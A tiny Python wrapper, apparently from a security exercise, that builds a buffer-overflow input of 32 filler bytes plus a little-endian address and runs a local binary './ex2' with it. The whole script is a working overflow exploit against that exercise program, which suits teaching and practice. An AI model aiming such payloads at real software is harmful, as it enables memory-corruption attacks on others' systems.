#!/usr/bin/python3
# # wrapper

import os

buff = 32 * (b"x")
addr = bytearray.fromhex("3c34")
addr.reverse()

buff += addr
print("exec ./ex2 with buff", buff)
os.execv("./ex2", ["./ex2", buff])
